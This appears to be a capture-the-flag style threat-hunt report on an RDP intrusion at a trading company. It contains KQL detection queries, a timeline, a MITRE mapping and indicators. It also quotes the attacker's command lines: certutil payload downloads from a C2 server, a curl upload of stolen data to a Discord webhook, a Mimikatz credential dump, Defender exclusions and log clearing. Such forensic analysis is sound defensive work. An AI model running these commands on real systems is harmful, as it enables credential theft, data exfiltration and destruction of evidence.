<div align="center">

# THREAT HUNT REPORT
## Azuki Import/Export Trading Co.
### 梓貿易株式会社

![Threat Hunt](https://img.shields.io/badge/Type-Threat%20Hunt-red?style=for-the-badge&logo=microsoftdefender)
![Status](https://img.shields.io/badge/Status-Complete-brightgreen?style=for-the-badge)
![Flags](https://img.shields.io/badge/Flags%20Captured-20%2F20-blue?style=for-the-badge)
![Attribution](https://img.shields.io/badge/Threat%20Actor-JADE%20SPIDER-orange?style=for-the-badge)

---

**Classification:** `CONFIDENTIAL` &nbsp;|&nbsp; **Analyst:** Ramin Delsouz &nbsp;|&nbsp; **Date:** April 10, 2026

**Log Source:** Microsoft Defender for Endpoint via Microsoft Sentinel &nbsp;|&nbsp; **Host:** `AZUKI-SL`

</div>

---

## Table of Contents

- [Executive Summary](#-executive-summary)
- [Threat Actor Profile — JADE SPIDER](#-threat-actor-profile--jade-spider)
- [Attack Timeline](#-attack-timeline)
- [Technical Findings](#-technical-findings)
  - [Initial Access](#initial-access)
  - [Discovery](#discovery)
  - [Defence Evasion](#defence-evasion)
  - [Execution](#execution)
  - [Persistence](#persistence)
  - [Credential Access](#credential-access)
  - [Command and Control](#command-and-control)
  - [Collection and Exfiltration](#collection-and-exfiltration)
  - [Lateral Movement](#lateral-movement)
  - [Anti-Forensics](#anti-forensics)
- [MITRE ATT&CK Mapping](#-mitre-attck-mapping)
- [Indicators of Compromise](#-indicators-of-compromise)
- [Recommendations](#-recommendations)
- [Conclusion](#-conclusion)

---

## Executive Summary

> [!WARNING]
> **Active Intrusion Confirmed.** Sensitive pricing data and supplier contracts were exfiltrated and subsequently appeared on underground forums, enabling a competitor to undercut Azuki's six-year shipping contract by exactly **3%**.

Azuki Import/Export Trading Co. suffered a targeted network intrusion attributed with moderate confidence to **JADE SPIDER (APT-SL44 / SilentLynx)** — a financially motivated threat actor specialising in East Asian logistics companies. The attacker gained initial access to the IT administrator workstation `AZUKI-SL` via an exposed Remote Desktop Protocol connection on **November 19, 2025**.

From that single entry point, the attacker:

- Conducted network reconnaissance using native Windows tools
- Disabled Windows Defender via registry modification
- Downloaded a custom toolkit from a remote C2 server
- Dumped credentials from LSASS memory using a renamed Mimikatz
- Established two persistence mechanisms and a backdoor account
- Exfiltrated stolen data via a Discord webhook
- Expanded laterally to at least two additional internal machines
- Attempted to destroy forensic evidence before departing

**Twenty forensic flags** were identified and confirmed through log analysis in Microsoft Sentinel.

---

## Threat Actor Profile — JADE SPIDER

| Attribute | Detail |
|---|---|
| **Name** | JADE SPIDER |
| **Aliases** | APT-SL44, SilentLynx |
| **Active Since** | 2019 |
| **Motivation** | Financial |
| **Primary Targets** | Logistics companies, East Asia |
| **Typical Dwell Time** | 21 to 45 days |
| **Attribution Confidence** | Moderate |
| **Last Observed** | November 2025 |
| **Recent Victims** | 30+ across Japan, South Korea, Taiwan, Singapore |

JADE SPIDER is notable for its preference for **Living off the Land (LotL) techniques** — relying entirely on tools already installed on Windows rather than deploying custom malware. Their name resurfaced directly in this investigation: the binary `silentlynx.exe` was discovered in a second persistence scheduled task, which is one of JADE SPIDER's known aliases embedded as a calling card.

<div align="center">

![Jade Spider Tradecraft](assets/jade%20spider%20meme.jpeg)

*JADE SPIDER's entire attack strategy, summarised.*

</div>

---

## Attack Timeline

```
Nov 19 — 18:33  115.247.157.74 connects to RDP port on AZUKI-SL
Nov 19 — 18:35  88.97.178.12 connects to RDP port on AZUKI-SL
Nov 19 — 18:36  kenji.sato authenticates via RDP ← INITIAL ACCESS
Nov 19 — 18:37  PowerShell (-WindowStyle Hidden) downloads wupdate.bat from C2
Nov 19 — 18:46  PowerShell downloads wupdate.ps1 to Temp directory
Nov 19 — 18:49  Windows Defender exclusions added (3 extensions + 2 paths)
Nov 19 — 19:04  ARP.EXE -a executed — network neighbour enumeration
Nov 19 — 19:05  certutil.exe downloads svchost.exe (malware) to WindowsCache
Nov 19 — 19:07  certutil.exe downloads AdobeGC.exe → renamed mm.exe
Nov 19 — 19:07  Scheduled task "Windows Update Check" created
Nov 19 — 19:08  mm.exe executes sekurlsa::logonpasswords — credential dump
Nov 19 — 19:09  Backdoor account "support" created + added to Administrators
Nov 19 — 19:09  export-data.zip created and exfiltrated via Discord webhook
Nov 19 — 19:10  cmdkey stores stolen credentials for 10.1.0.188 (fileadmin)
Nov 19 — 19:11  svchost.exe beacons to 78.141.196.6:443 — C2 ACTIVE
Nov 19 — 19:11  wevtutil.exe cl Security — Security event log CLEARED
Nov 19 — 19:40  mstsc.exe /v:10.1.0.188 — lateral movement begins
Nov 25 — 06:07  Second scheduled task created — silentlynx.exe on logon
Nov 25 — 06:10  cmdkey stores credentials for 10.1.0.108 (yuki.tanaka)
Nov 25 — 06:41  mstsc.exe /v:10.1.0.108 — lateral movement continues
```

---

## Technical Findings

### Initial Access

#### Flag 1 — Remote Access Source `T1190`

> [!IMPORTANT]
> **Source IP:** `88.97.178.12` connected to port 3389 exactly **25 seconds** before the first successful logon — consistent with a human entering credentials after the RDP session was established.

| Field | Value |
|---|---|
| **Source IP** | `88.97.178.12` |
| **Target Account** | `kenji.sato` |
| **Logon Type** | RemoteInteractive |
| **Result** | LogonSuccess — 18:36:21 UTC, November 19, 2025 |

<details>
<summary>KQL Query Used</summary>

```kql
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where LocalPort == 3389
| where Timestamp between (datetime(2025-11-19T18:00:00) .. datetime(2025-11-19T19:00:00))
| where RemoteIP !startswith "10."
| project Timestamp, RemoteIP, ActionType
| sort by Timestamp asc
```

</details>

---

#### Flag 2 — Compromised Account `T1078`

The account used throughout the entire attack chain was **`kenji.sato`** — a domain account on `azuki-sl` with IT administrator privileges. All initial activity, credential dumping, and lateral movement preparation was conducted under this identity across multiple sessions between November 19 and November 25, 2025.

---

### Discovery

#### Flag 3 — Network Reconnaissance `T1016`

Immediately after gaining access, the attacker ran `ARP.EXE -a` to enumerate all devices on the local network and their hardware (MAC) addresses. This is a textbook LotL technique — a signed, built-in Windows binary that leaves minimal suspicious indicators.

| Field | Value |
|---|---|
| **Command** | `ARP.EXE -a` |
| **Account** | `kenji.sato` |
| **Timestamp** | November 19, 2025 — 19:04:01 UTC |
| **Purpose** | Enumerate network neighbours and MAC addresses |

Additional commands observed at the same time:
- `ipconfig /all` — local network configuration mapping
- `net user support` — checking specific accounts
- `net accounts` — enumerating password policies

<details>
<summary>KQL Query Used</summary>

```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19T18:36:00) .. datetime(2025-11-20T23:59:00))
| where ProcessCommandLine contains "arp"
   or FileName == "arp.exe"
| project Timestamp, FileName, ProcessCommandLine, AccountName
| sort by Timestamp asc
```

</details>

---

### Defence Evasion

#### Flag 4 — Malware Staging Directory `T1564.001`

The attacker created a hidden directory to store downloaded tools and staged exfiltration data. The folder was named to resemble a legitimate Windows cache component.

| Field | Value |
|---|---|
| **Directory** | `C:\ProgramData\WindowsCache` |
| **Command** | `attrib.exe +h +s C:\ProgramData\WindowsCache` |
| **Effect** | Hidden from normal browsing, protected from casual deletion |

---

#### Flag 5 — File Extension Exclusions `T1562.001`

The attacker modified Windows Defender's registry to exclude specific file extensions from antivirus scanning — allowing malicious executables to be written and run without triggering any alerts.

| RegistryValueName | RegistryValueData | ActionType |
|---|---|---|
| `.bat` | 0 | RegistryValueSet |
| `.ps1` | 0 | RegistryValueSet |
| `.exe` | 0 | RegistryValueSet |

> [!NOTE]
> **Total exclusions added: 3**

---

#### Flag 6 — Temporary Folder Exclusion `T1562.001`

| Field | Value |
|---|---|
| **Excluded Path** | `C:\Users\KENJI~1.SAT\AppData\Local\Temp` |
| **Registry Key** | `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths` |

---

<div align="center">

![Windows Defender Meme](assets/Windows%20Defender%20meme.jpeg)

*Windows Defender's response after the attacker configured exclusions.*

</div>

---

#### Flag 7 — Download Utility Abuse `T1105`

With Defender blinded, the attacker used **`certutil.exe`** — a legitimate Windows certificate management binary — to download malicious payloads directly from the C2 server.

| Timestamp | Binary | Command |
|---|---|---|
| 18:37:40 | `powershell.exe` | `-WindowStyle Hidden ... Invoke-WebRequest wupdate.bat` |
| 18:46:27 | `powershell.exe` | `-ExecutionPolicy Bypass ... Invoke-WebRequest wupdate.bat -OutFile ...` |
| 18:46:50 | `powershell.exe` | `-ExecutionPolicy Bypass ... Invoke-WebRequest wupdate.ps1 -OutFile ...` |
| 19:04:57 | `certutil.exe` | `-urlcache -f http://78.141.196.6:8080/svchost.exe C:\ProgramData\WindowsCache\svchost.exe` |
| 19:07:21 | `certutil.exe` | `-urlcache -f http://78.141.196.6:8080/AdobeGC.exe C:\ProgramData\WindowsCache\mm.exe` |
| 19:09:21 | `curl.exe` | `-F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/...` |

<details>
<summary>KQL Query Used</summary>

```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp > datetime(2025-11-19T18:36:00)
| where FileName in ("powershell.exe", "certutil.exe", "curl.exe")
| where ProcessCommandLine contains "http"
| project Timestamp, FileName, ProcessCommandLine
| sort by Timestamp asc
```

</details>

---

### Execution

#### Flag 18 — Malicious PowerShell Script `T1059.001`

| Field | Value |
|---|---|
| **Script File** | `wupdate.ps1` |
| **Source URL** | `http://78.141.196.6:8080/wupdate.ps1` |
| **Saved To** | `C:\Users\kenji.sato\AppData\Local\Temp\` |
| **Execution** | `powershell -ExecutionPolicy Bypass -WindowStyle Hidden` |

> [!NOTE]
> The `-WindowStyle Hidden` flag ensured no PowerShell window appeared on screen, making execution completely invisible to any user at the machine.

---

### Persistence

#### Flag 8 — Scheduled Task `T1053.005`

| Field | Value |
|---|---|
| **Task Name** | `Windows Update Check` |
| **Executable** | `C:\ProgramData\WindowsCache\svchost.exe` |
| **Schedule** | Daily at 02:00 under SYSTEM account |
| **Timestamp** | November 19, 2025 — 19:07:46 UTC |

#### Flag 9 — Scheduled Task Executable

| Field | Value |
|---|---|
| **Path** | `C:\ProgramData\WindowsCache\svchost.exe` |
| **Note** | Malicious C2 implant disguised as a legitimate Windows system process name |

> [!WARNING]
> A **second** scheduled task was also discovered on November 25, pointing to `C:\Windows\Temp\silentlynx.exe` — configured to run at every logon. **SilentLynx is one of JADE SPIDER's known aliases.** The threat actor embedded their own name as a calling card inside the persistence mechanism.

<details>
<summary>KQL Query Used</summary>

```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp > datetime(2025-11-19T18:36:00)
| where FileName == "schtasks.exe"
| where ProcessCommandLine contains "/create"
| project Timestamp, FileName, ProcessCommandLine
| sort by Timestamp asc
```

</details>

---

#### Flag 17 — Backdoor Account `T1136.001`

| Field | Value |
|---|---|
| **Backdoor Account** | `support` |
| **Command** | `net.exe user support ********** /add` |
| **Group Added To** | Local Administrators |
| **Timestamp** | November 19, 2025 — 19:09:48 UTC |

The account was named to appear as a legitimate IT helpdesk or support account — providing a fallback access method that survives password resets on the `kenji.sato` account.

---

### Credential Access

#### Flag 12 — Credential Theft Tool `T1003.001`

> [!IMPORTANT]
> The attacker deployed a renamed copy of **Mimikatz** (`mm.exe`) to extract credentials from Windows LSASS memory. Renaming the binary was a deliberate attempt to evade signature-based detection.

| Field | Value |
|---|---|
| **Tool** | `mm.exe` (Mimikatz, renamed) |
| **Full Command** | `mm.exe privilege::debug sekurlsa::logonpasswords exit` |
| **Initiating Process** | `powershell.exe` |
| **Target** | `lsass.exe` — Windows credential store |
| **Timestamp** | November 19, 2025 — 19:08:26 UTC |

#### Flag 13 — Memory Extraction Module `T1003.001`

| Field | Value |
|---|---|
| **Module** | `sekurlsa::logonpasswords` |
| **Effect** | Extracts plaintext passwords, NTLM hashes, and Kerberos tickets from all logged-in users |

> **What is LSASS?** The Local Security Authority Subsystem Service (`lsass.exe`) is a critical Windows process that keeps credential material in memory while users are logged in. On an IT administrator workstation, dumping LSASS can yield domain-wide credentials — the keys to the entire network.

<details>
<summary>KQL Query Used</summary>

```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp > datetime(2025-11-19T18:36:00)
| where ProcessCommandLine contains "lsass"
   or FileName == "mm.exe"
   or InitiatingProcessFileName == "mm.exe"
| project Timestamp, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by Timestamp asc
```

</details>

---

### Command and Control

#### Flag 10 — C2 Server Address `T1071.001`

| Field | Value |
|---|---|
| **C2 Server** | `78.141.196.6` |
| **Download Port** | `8080` — served malware payloads via HTTP |
| **C2 Beacon Port** | `443` — C2 communication disguised as HTTPS |
| **Initiating Process** | `svchost.exe` (malicious) |
| **First Beacon** | November 19, 2025 — 19:11:04 UTC |

#### Flag 11 — C2 Communication Port `T1071.001`

**Port: `443`**

The malware communicated with the C2 server over HTTPS, deliberately blending with normal encrypted web browsing traffic. This technique makes C2 traffic nearly impossible to detect without SSL inspection and is rarely blocked by corporate firewalls.

> [!NOTE]
> The same IP (`78.141.196.6`) served malware downloads on port `8080` and received C2 beacon connections on port `443` — a common attacker pattern of consolidating infrastructure onto a single server.

---

### Collection and Exfiltration

#### Flag 14 — Data Staging Archive `T1560.001`

| Field | Value |
|---|---|
| **Archive File** | `export-data.zip` |
| **Location** | `C:\ProgramData\WindowsCache\export-data.zip` |
| **Contents** | Supplier contracts and pricing data — the intelligence later found on underground forums |

#### Flag 15 — Exfiltration Method `T1567`

| Field | Value |
|---|---|
| **Tool** | `curl.exe` |
| **Destination** | `https://discord.com/api/webhooks/14322472661...` |
| **Full Command** | `curl.exe -F file=@C:\ProgramData\WindowsCache\export-data.zip [webhook URL]` |

> **Why Discord?** Discord webhooks accept file uploads over HTTPS, originate from a widely trusted domain, and are almost never blocked by corporate firewalls — making them an increasingly popular exfiltration channel for threat actors.

---

### Lateral Movement

#### Flag 19 — Secondary Target `T1021.001`

Following credential theft, the attacker used stolen credentials to pivot to additional internal machines.

| Timestamp | Command | Target |
|---|---|---|
| Nov 19 — 19:10:37 | `cmdkey /generic:10.1.0.188 /user:fileadmin /pass:***` | `10.1.0.188` |
| Nov 19 — 19:40:41 | `mstsc.exe /v:10.1.0.188` | `10.1.0.188` |
| Nov 25 — 04:06:10 | `cmdkey /add:10.1.0.108 /user:yuki.tanaka /pass:***` | `10.1.0.108` |
| Nov 25 — 04:06:41 | `mstsc.exe /v:10.1.0.108` | `10.1.0.108` |

#### Flag 20 — Remote Access Tool `T1021.001`

**Tool: `mstsc.exe`** — the native Windows Remote Desktop Connection client.

Using a built-in Windows tool for lateral movement makes the activity appear indistinguishable from legitimate administrator behaviour — another example of JADE SPIDER's preference for living-off-the-land techniques.

---

### Anti-Forensics

#### Flag 16 — Log Tampering `T1070.001`

| Field | Value |
|---|---|
| **Tool** | `wevtutil.exe` |
| **Command** | `wevtutil.exe cl Security` |
| **First Log Cleared** | `Security` |
| **Timestamp** | November 19, 2025 — 19:11:39 UTC |

The Security log was cleared first because it contains the most critical forensic evidence — specifically the RDP logon records identifying the initial access source and the `kenji.sato` authentication events.

<div align="center">

![Port of Entry Meme](assets/Port%20of%20entry%20meme.jpeg)

*The Security event log after the attacker finished.*

</div>

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access | Exploit Public-Facing Application (RDP) | `T1190` | RDP from `88.97.178.12` |
| Initial Access | Valid Accounts | `T1078` | `kenji.sato` credentials used |
| Discovery | System Network Configuration Discovery | `T1016` | `ipconfig /all`, `arp -a` |
| Discovery | Account Discovery | `T1087` | `net user`, `net accounts` |
| Defence Evasion | Impair Defenses: Disable or Modify Tools | `T1562.001` | Defender exclusions via registry |
| Defence Evasion | Hide Artifacts: Hidden Files and Directories | `T1564.001` | `attrib +h +s` on staging directory |
| Defence Evasion | Masquerading | `T1036` | Malware named `svchost.exe`, `AdobeGC.exe` |
| Execution | Command and Scripting: PowerShell | `T1059.001` | `wupdate.ps1` downloaded and executed |
| Persistence | Scheduled Task/Job | `T1053.005` | Two scheduled tasks created |
| Persistence | Create Account: Local Account | `T1136.001` | Backdoor account `support` |
| Credential Access | OS Credential Dumping: LSASS Memory | `T1003.001` | `mm.exe` — `sekurlsa::logonpasswords` |
| Command & Control | Ingress Tool Transfer | `T1105` | `certutil.exe` downloading payloads |
| Command & Control | Application Layer Protocol: Web Protocols | `T1071.001` | C2 over HTTPS port `443` |
| Collection | Archive Collected Data | `T1560.001` | `export-data.zip` |
| Exfiltration | Exfiltration Over Web Service | `T1567` | `curl.exe` to Discord webhook |
| Lateral Movement | Remote Services: Remote Desktop Protocol | `T1021.001` | `mstsc.exe` to `10.1.0.188` and `10.1.0.108` |
| Defence Evasion | Indicator Removal: Clear Windows Event Logs | `T1070.001` | `wevtutil.exe cl Security` |

---

## Indicators of Compromise

### Network Indicators

| Type | Value | Context |
|---|---|---|
| IP Address | `88.97.178.12` | RDP initial access source |
| IP Address | `78.141.196.6` | C2 server — malware hosting and beacon destination |
| IP Address | `10.1.0.188` | Internal lateral movement target (fileadmin) |
| IP Address | `10.1.0.108` | Internal lateral movement target (yuki.tanaka) |
| URL | `http://78.141.196.6:8080/svchost.exe` | Malware download |
| URL | `http://78.141.196.6:8080/AdobeGC.exe` | Credential theft tool download |
| URL | `http://78.141.196.6:8080/wupdate.ps1` | Attack automation script |
| URL | `http://78.141.196.6:8080/wupdate.bat` | Attack automation script (batch) |
| Port | `443` | C2 communication — HTTPS |
| Port | `8080` | Malware delivery — HTTP |
| Domain | `discord.com/api/webhooks/` | Exfiltration destination |

### Host Indicators

| Type | Value | Context |
|---|---|---|
| File | `svchost.exe` | Malicious C2 implant in `C:\ProgramData\WindowsCache\` |
| File | `mm.exe` | Renamed Mimikatz in `C:\ProgramData\WindowsCache\` |
| File | `silentlynx.exe` | Second persistence binary in `C:\Windows\Temp\` |
| File | `wupdate.ps1` | Attack automation script |
| File | `wupdate.bat` | Attack automation script (batch) |
| File | `export-data.zip` | Exfiltration archive |
| Directory | `C:\ProgramData\WindowsCache` | Hidden malware staging directory |
| Registry Key | `...Defender\Exclusions\Extensions` | `.bat`, `.ps1`, `.exe` excluded from scanning |
| Registry Key | `...Defender\Exclusions\Paths` | Temp and WindowsCache excluded |
| Scheduled Task | `Windows Update Check` | Persistence — `svchost.exe` at 02:00 under SYSTEM |
| Scheduled Task | `SecurityHealthService` (spoofed) | Persistence — `silentlynx.exe` on logon |
| Account | `support` | Backdoor local administrator account |
| Account | `kenji.sato` | Compromised IT administrator account |

---

## Recommendations

<details>
<summary><b>1. Disable or Restrict RDP Exposure</b></summary>

The entire compromise originated from an internet-exposed RDP port. RDP should never be directly accessible from the public internet. Remote access must be gated behind a VPN with multi-factor authentication enforced before any RDP session can be established.

</details>

<details>
<summary><b>2. Enforce Multi-Factor Authentication on All Remote Access</b></summary>

Even behind a VPN, a single compromised password should not be sufficient for access. MFA would have prevented the attacker from completing the logon even after obtaining valid credentials for `kenji.sato`.

</details>

<details>
<summary><b>3. Enable Windows Defender Tamper Protection</b></summary>

The attacker modified Defender exclusions via registry edits. Tamper Protection prevents unauthorised changes to Defender configuration and would have stopped this evasion technique entirely.

</details>

<details>
<summary><b>4. Monitor for LOLBin Abuse</b></summary>

`certutil.exe`, `mstsc.exe`, `wevtutil.exe`, and `schtasks.exe` are all legitimate Windows tools abused in this attack. Detection rules should alert on unusual usage of these binaries — particularly when they involve external URLs, unusual arguments, or non-standard parent processes.

</details>

<details>
<summary><b>5. Deploy LSASS Protection Controls</b></summary>

Enable Windows Credential Guard and configure LSASS as a protected process (PPL) to prevent memory dumping tools like Mimikatz from accessing credential material, even with administrator-level access.

</details>

<details>
<summary><b>6. Audit All Local Administrator Accounts</b></summary>

The backdoor account `support` may persist on other machines reached during lateral movement. All machines must be audited for unexpected local administrator accounts and reviewed against an approved baseline.

</details>

<details>
<summary><b>7. Rotate All Potentially Compromised Credentials</b></summary>

Given that `sekurlsa::logonpasswords` executed on the IT admin workstation, all credentials resident in LSASS memory at that time must be treated as compromised and rotated immediately — including `fileadmin` and `yuki.tanaka`, whose credentials were later used for lateral movement.

</details>

<details>
<summary><b>8. Block Outbound Connections to Discord Webhooks</b></summary>

Discord webhooks have become a common exfiltration channel. Outbound connections to `discord.com/api/webhooks` should be blocked at the perimeter for corporate environments where Discord is not a business-critical tool.

</details>

<details>
<summary><b>9. Implement Centralised Log Forwarding with Integrity Protection</b></summary>

The attacker cleared the Security event log using `wevtutil.exe`. Real-time log forwarding to a SIEM such as Microsoft Sentinel ensures that log clearing on the endpoint does not destroy the forensic record, as events are already shipped off the machine before clearing can occur.

</details>

<details>
<summary><b>10. Implement Network Segmentation and Least-Privilege Access</b></summary>

The attacker moved from the IT admin workstation to at least two additional internal hosts using RDP and stolen credentials. Network segmentation and strict least-privilege access controls would significantly reduce the blast radius of a single compromised workstation.

</details>

---

## Conclusion

The Azuki Import/Export intrusion demonstrates how a determined threat actor can compromise an organisation using almost entirely built-in Windows tools, minimal custom malware, and patient, methodical tradecraft. From a single exposed RDP port, JADE SPIDER achieved initial access, disabled defences, stole credentials, exfiltrated sensitive business data, established persistent backdoor access across multiple mechanisms, and attempted to cover their tracks — all within hours of the first connection, with lateral movement continuing for days afterward.

The financial impact was immediate. The leaked pricing data cost Azuki a six-year shipping contract. With lateral movement confirmed to at least two additional machines and credentials for multiple accounts in attacker hands, the full scope of the compromise extends well beyond `AZUKI-SL`.

---

<div align="center">

---

*"When in doubt, Zero Trust it out."*

**— Ramin Delsouz, Security Analyst**

---

</div>
